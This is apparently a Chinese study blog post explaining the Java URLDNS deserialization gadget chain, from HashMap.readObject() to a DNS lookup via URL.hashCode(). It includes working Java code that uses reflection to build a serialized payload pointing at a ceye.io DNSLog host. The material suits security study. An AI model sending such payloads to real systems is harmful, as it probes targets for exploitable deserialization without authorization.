      <title type="text">URLDNS链</title>
      <published>2026-07-26T09:01:50.000Z</published>
      <updated>2026-07-26T09:01:50.000Z</updated>
      <author><name>林不到</name></author>
      <link rel="alternate" href="https://linbudao.github.io/posts/urldns%E9%93%BE/"/>
      <summary type="text">学习自 https://xz.aliyun.com/news/12113 https://www.cnblogs.com/Timesi/p/17156594.html http…</summary>
      <content type="html"><![CDATA[<section><h2>URLDNS利用链<a href="#urldns利用链"><span>#</span></a></h2><p>学习自</p><p><a href="https://xz.aliyun.com/news/12113" target="_blank">https://xz.aliyun.com/news/12113</a></p><p><a href="https://www.cnblogs.com/Timesi/p/17156594.html" target="_blank">https://www.cnblogs.com/Timesi/p/17156594.html</a></p><p><a href="https://yuy0ung.github.io/blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/urldns%E9%93%BE/" target="_blank">https://yuy0ung.github.io/blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/urldns%E9%93%BE/</a></p><p><code>URLDNS</code> 是反序列化一条极其经典的利用链</p><p>不执行系统命令（不能弹计算器，也不能反弹 shell）</p><p>依赖JDK自带类</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>java</span><span>.</span><span>util</span><span>.</span><span>HashMap</span></div></div><div><div><div>2</div></div><div><span>java</span><span>.</span><span>net</span><span>.</span><span>URL</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>并不要求目标安装 Commons Collections、BeanUtils 等第三方库</p><p>其作用是发起一次 DNS 请求，来做反序列化探测</p><p>DNSLog看到解析记录，我们就知道两件事：</p><ul>
<li>
<p>这个点大概率存在反序列化</p>
</li>
<li>
<p>反序列化走到了危险对象处理逻辑</p>
</li>
</ul><p>官方注释链路如下</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>HashMap.readObject()</span></div></div><div><div><div>2</div></div><div><span><span>  </span></span><span>HashMap.putVal()</span></div></div><div><div><div>3</div></div><div><span><span>    </span></span><span>HashMap.hash()</span></div></div><div><div><div>4</div></div><div><span><span>      </span></span><span>URL.hashCode()</span></div></div></code></pre><div><div></div><div></div></div></figure></div><section><h3>入口点<code>HashMap.readObject()</code><a href="#入口点hashmapreadobject"><span>#</span></a></h3><p>目标服务器接收序列化数据，准备调用<code>ObjectInputStream.readObject()</code>来还原对象</p><p>如果还原的是一个<code>HashMap</code>，会自动调用<code>HashMap</code>内部重写的<code>readObject()</code>方法</p><p>而<code>HashMap</code>在反序列化时，为了重建哈希表，会把序列化流里面的键值对挨个读取出来再重新计算哈希值，以此来决定它们在内存表里里面的位置</p></section><section><h3>触发哈希计算 <code>HashMap.hash(key)</code><a href="#触发哈希计算-hashmaphashkey"><span>#</span></a></h3><p>重建过程中，<code>HashMap</code> 这种容器对象需要重新建桶，重新放entry，重新计算hash，对每一个 Key 调用 <code>.hashCode()</code> 方法来获取它的哈希值</p><p><strong>关键设计：</strong>  payload 中把一个 <strong><code>URL</code> 对象</strong> 当作 Key 塞进了这个 <code>HashMap</code> 里。所以，这里实际上调用的是 <code>URL.hashCode()</code></p></section><section><h3>URL 类的特殊机制 <code>URL.hashCode()</code><a href="#url-类的特殊机制-urlhashcode"><span>#</span></a></h3><p><code>java.net.URL</code> 类有一个特殊行为——它的 <code>equals()</code> 和 <code>hashCode()</code> 方法在比较/计算哈希值时，会顺带发起一次 DNS 查询（因为要把域名解析成 IP 来判断两个URL是否指向同一台主机）。<code>hash()</code> 内部会去调用 key 对象自己的 <code>hashCode()</code> 方法：</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>// java.util.HashMap 源码里的 hash() 方法（简化版）</span></div></div><div><div><div>2</div></div><div><span>static</span><span> </span><span>final</span><span> </span><span>int</span><span> </span><span>hash</span><span>(</span><span>Object</span><span> key) {</span></div></div><div><div><div>3</div></div><div><span>    </span><span>int</span><span> h</span><span>;</span></div></div><div><div><div>4</div></div><div><span>    </span><span>//key 不是 null，就一定会调用 key.hashCode()</span></div></div><div><div><div>5</div></div><div><span>    </span><span>return</span><span><span> (key </span><span>==</span><span> </span></span><span>null</span><span>) </span><span>?</span><span> </span><span>0</span><span> </span><span>:</span><span><span> (h </span><span>=</span><span> </span></span><span>key</span><span>.</span><span>hashCode</span><span><span>()</span><span>) </span><span>^</span><span> (h </span><span>&gt;&gt;&gt;</span><span> </span></span><span>16</span><span><span>)</span><span>;</span></span></div></div><div><div><div>6</div></div><div><span>}</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>hashCode还有一个特点，URL会缓存已经计算过的哈希值</p><p>逻辑类似于</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>private</span><span> </span><span>int</span><span> hashCode </span><span><span>=</span><span> </span><span>-</span></span><span>1</span><span>;</span></div></div><div><div><div>2</div></div><div>
</div></div><div><div><div>3</div></div><div><span>public</span><span> </span><span>synchronized</span><span> </span><span>int</span><span> </span><span>hashCode</span><span>() {</span></div></div><div><div><div>4</div></div><div><span>    </span><span>if</span><span><span> (hashCode </span><span>!=</span><span> </span><span>-</span></span><span>1</span><span>) {</span></div></div><div><div><div>5</div></div><div><span>        </span><span>return</span><span><span> hashCode</span><span>;</span></span></div></div><div><div><div>6</div></div><div><span><span>    </span></span><span>}</span></div></div><div><div><div>7</div></div><div>
</div></div><div><div><div>8</div></div><div><span><span>    </span></span><span>hashCode </span><span>=</span><span> </span><span>handler</span><span>.</span><span>hashCode</span><span>(</span><span>this</span><span>);</span></div></div><div><div><div>9</div></div><div><span>    </span><span>return</span><span><span> hashCode</span><span>;</span></span></div></div><div><div><div>10</div></div><div><span>}</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>若hashcode值为-1时，尚未计算，它会调用 <code>URLStreamHandler.hashCode(this)</code> 发起DNS查询解析域名，计算出哈希值并保存到 <code>hashCode</code> 字段中</p><p>若hashCode!=-1时，已经计算过，直接返回缓存值</p><p>我们可以通过设置缓存值为一个不为-1的数来避免提前产生DNS查询</p><p>这里就要用到我们的反射机制了</p><p>URL的hashCode缓存字段是<code>private</code>，普通代码无法直接访问，就要用到反射去修改值</p><p>先去获取这个类的元信息</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>Class</span><span> c </span><span><span>=</span><span> </span></span><span>url</span><span>.</span><span>getClass</span><span>();</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>当然也可以这样写</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>Class</span><span>&lt;</span><span>URL</span><span><span>&gt;</span><span> c </span></span><span><span>=</span><span> </span></span><span>URL</span><span>.</span><span>class</span><span>;</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>找到私有字段</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>Field</span><span> hashcodefield </span><span><span>=</span><span> </span></span><span>c</span><span>.</span><span>getDeclaredField</span><span>(</span><span>"hashCode"</span><span>);</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>取消普通的 Java 语言访问检查，允许后续修改这个私有字段</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>hashcodefield</span><span>.</span><span>set</span><span>(url, </span><span>1234</span><span>);</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>然后再修改值见下</p><p>所以这条链子的思路很简单</p><p>构造一个<code>HashMap</code>，把URL对象当作key放进去，序列化之后反序列化，反序列化过程中 <code>HashMap.readObject()</code> 会自动帮我们调用这个 URL 对象的 <code>hashCode()</code>，从而触发 DNS 查询</p></section><section><h3>在本地触发<a href="#在本地触发"><span>#</span></a></h3><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>import</span><span> </span><span>java.net.MalformedURLException</span><span>;</span></div></div><div><div><div>2</div></div><div><span>import</span><span> </span><span>java.net.URL</span><span>;</span></div></div><div><div><div>3</div></div><div><span>import</span><span> </span><span>java.util.HashMap</span><span>;</span></div></div><div><div><div>4</div></div><div>
</div></div><div><div><div>5</div></div><div><span>public</span><span> </span><span>class</span><span><span> </span><span>URLDNS_Test</span><span> </span></span><span>{</span></div></div><div><div><div>6</div></div><div><span>    </span><span>public</span><span> </span><span>static</span><span> </span><span>void</span><span> </span><span>main</span><span>(</span><span>String</span><span><span>[] </span><span>args</span><span>)</span><span> </span></span><span>throws</span><span> </span><span>MalformedURLException</span><span><span> </span><span>{</span></span></div></div><div><div><div>7</div></div><div><span>        </span><span>HashMap</span><span>&lt;</span><span>URL</span><span>,</span><span>Integer</span><span><span>&gt; </span><span>map</span><span> </span></span><span><span>=</span><span> </span></span><span>new</span><span> </span><span>HashMap</span><span>&lt;</span><span>URL</span><span>,</span><span>Integer</span><span>&gt;();</span></div></div><div><div><div>8</div></div><div><span>        </span><span>URL</span><span><span> </span><span>url</span><span> </span></span><span><span>=</span><span> </span></span><span>new</span><span> </span><span>URL</span><span>(</span><span>"http://Linbudao.wzbnyc.ceye.io"</span><span>);</span></div></div><div><div><div>9</div></div><div><span>        </span><span>map</span><span>.</span><span>put</span><span>(url,</span><span>1</span><span>);</span></div></div><div><div><div>10</div></div><div><span><span>    </span></span><span>}</span></div></div><div><div><div>11</div></div><div><span>}</span></div></div></code></pre><div><div></div><div></div></div></figure></div></section><section><h3>序列化payload<a href="#序列化payload"><span>#</span></a></h3><p>生成一个ser.bin</p><div><div><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>import</span><span> </span><span>java.io.FileOutputStream</span><span>;</span></div></div><div><div><div>2</div></div><div><span>import</span><span> </span><span>java.io.IOException</span><span>;</span></div></div><div><div><div>3</div></div><div><span>import</span><span> </span><span>java.io.ObjectOutputStream</span><span>;</span></div></div><div><div><div>4</div></div><div><span>import</span><span> </span><span>java.lang.reflect.Field</span><span>;</span></div></div><div><div><div>5</div></div><div><span>import</span><span> </span><span>java.net.URL</span><span>;</span></div></div><div><div><div>6</div></div><div><span>import</span><span> </span><span>java.util.HashMap</span><span>;</span></div></div><div><div><div>7</div></div><div><span>import</span><span> </span><span>java.util.Map</span><span>;</span></div></div><div><div><div>8</div></div><div>
</div></div><div><div><div>9</div></div><div><span>public</span><span> </span><span>class</span><span><span> </span><span>SerializationTest</span><span> </span></span><span>{</span></div></div><div><div><div>10</div></div><div>
</div></div><div><div><div>11</div></div><div><span>    </span><span>public</span><span> </span><span>static</span><span> </span><span>void</span><span> </span><span>serialize</span><span>(</span><span>Object</span><span><span> </span><span>object</span><span>)</span><span> </span></span><span>throws</span><span> </span><span>IOException</span><span><span> </span><span>{</span></span></div></div><div><div><div>12</div></div><div><span>        </span><span>try</span><span> (</span><span>ObjectOutputStream</span><span><span> </span><span>output</span><span> </span></span><span>=</span></div></div><div><div><div>13</div></div><div><span>                 </span><span>new</span><span> </span><span>ObjectOutputStream</span><span>(</span><span>new</span><span> </span><span>FileOutputStream</span><span>(</span><span>"ser.bin"</span><span>))) {</span></div></div><div><div><div>14</div></div><div><span>            </span><span>output</span><span>.</span><span>writeObject</span><span>(object);</span></div></div><div><div><div>15</div></div><div><span><span>        </span></span><span>}</span></div></div><div><div><div>16</div></div><div><span><span>    </span></span><span>}</span></div></div><div><div><div>17</div></div><div>
</div></div><div><div><div>18</div></div><div><span>    </span><span>public</span><span> </span><span>static</span><span> </span><span>void</span><span> </span><span>main</span><span>(</span><span>String</span><span><span>[] </span><span>args</span><span>)</span><span> </span></span><span>throws</span><span> </span><span>Exception</span><span><span> </span><span>{</span></span></div></div><div><div><div>19</div></div><div><span>        </span><span>URL</span><span><span> </span><span>url</span><span> </span></span><span><span>=</span><span> </span></span><span>new</span><span> </span><span>URL</span><span>(</span><span>"http://Linbudao.wzbnyc.ceye.io"</span><span>);</span></div></div><div><div><div>20</div></div><div><span>        </span><span>Field</span><span><span> </span><span>hashCodeField</span><span> </span></span><span><span>=</span><span> </span></span><span>URL</span><span>.</span><span>class</span><span>.</span><span>getDeclaredField</span><span>(</span><span>"hashCode"</span><span>);</span></div></div><div><div><div>21</div></div><div><span>        </span><span>hashCodeField</span><span>.</span><span>setAccessible</span><span>(</span><span>true</span><span>);</span></div></div><div><div><div>22</div></div><div>
</div></div><div><div><div>23</div></div><div><span>        </span><span>// 避免 HashMap.put() 在生成端解析 URL 主机名</span></div></div><div><div><div>24</div></div><div><span>        </span><span>hashCodeField</span><span>.</span><span>setInt</span><span>(url, </span><span>1234</span><span>);</span></div></div><div><div><div>25</div></div><div>
</div></div><div><div><div>26</div></div><div><span>        </span><span>Map</span><span>&lt;</span><span>URL</span><span>, </span><span>Integer</span><span><span>&gt; </span><span>map</span><span> </span></span><span><span>=</span><span> </span></span><span>new</span><span> </span><span>HashMap</span><span>&lt;&gt;();</span></div></div><div><div><div>27</div></div><div><span>        </span><span>map</span><span>.</span><span>put</span><span>(url, </span><span>1</span><span>);</span></div></div><div><div><div>28</div></div><div>
</div></div><div><div><div>29</div></div><div><span>        </span><span>// 让反序列化端重新计算 URL 的哈希值</span></div></div><div><div><div>30</div></div><div><span>        </span><span>hashCodeField</span><span>.</span><span>setInt</span><span><span>(url, </span><span>-</span></span><span>1</span><span>);</span></div></div><div><div><div>31</div></div><div><span>        </span><span>serialize</span><span>(map);</span></div></div><div><div><div>32</div></div><div><span>        </span><span>System</span><span>.</span><span>out</span><span>.</span><span>println</span><span>(</span><span>"Serialized payload written to ser.bin"</span><span>);</span></div></div><div><div><div>33</div></div><div><span><span>    </span></span><span>}</span></div></div><div><div><div>34</div></div><div><span>}</span></div></div></code></pre><div><div></div><div></div></div></figure><div></div></div><span>展开</span><span>收起</span></div></div></section><section><h3>完整调用链<a href="#完整调用链"><span>#</span></a></h3><div><div><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>ObjectInputStream.readObject()</span></div></div><div><div><div>2</div></div><div><span><span>        </span></span><span>↓</span></div></div><div><div><div>3</div></div><div><span>HashMap.readObject()</span></div></div><div><div><div>4</div></div><div><span><span>        </span></span><span>↓</span></div></div><div><div><div>5</div></div><div><span>HashMap 重新插入 key/value</span></div></div><div><div><div>6</div></div><div><span><span>        </span></span><span>↓</span></div></div><div><div><div>7</div></div><div><span>HashMap.hash(URL)</span></div></div><div><div><div>8</div></div><div><span><span>        </span></span><span>↓</span></div></div><div><div><div>9</div></div><div><span>URL.hashCode()</span></div></div><div><div><div>10</div></div><div><span><span>        </span></span><span>↓</span></div></div><div><div><div>11</div></div><div><span>URLStreamHandler.hashCode(URL)</span></div></div><div><div><div>12</div></div><div><span><span>        </span></span><span>↓</span></div></div><div><div><div>13</div></div><div><span>URLStreamHandler.getHostAddress(URL)</span></div></div><div><div><div>14</div></div><div><span><span>        </span></span><span>↓</span></div></div><div><div><div>15</div></div><div><span>InetAddress 主机名解析</span></div></div><div><div><div>16</div></div><div><span><span>        </span></span><span>↓</span></div></div><div><div><div>17</div></div><div><span>DNS 查询</span></div></div></code></pre><div><div></div><div></div></div></figure><div></div></div><span>展开</span><span>收起</span></div></div></section></section>]]></content>
